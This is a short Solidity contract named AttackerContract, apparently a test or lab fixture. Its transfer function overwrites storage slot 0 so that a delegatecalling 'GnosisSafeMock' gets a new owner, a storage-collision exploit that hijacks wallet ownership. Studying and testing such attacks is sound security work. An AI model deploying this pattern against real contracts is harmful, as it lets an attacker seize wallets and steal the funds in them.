// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract AttackerContract {
    // This matches the slot where GnosisSafeMock stores the owner
    address public dummy;

    function transfer(address _to, uint256) public {
        dummy = _to; // Overwrites storage slot 0 of caller!
    }
}
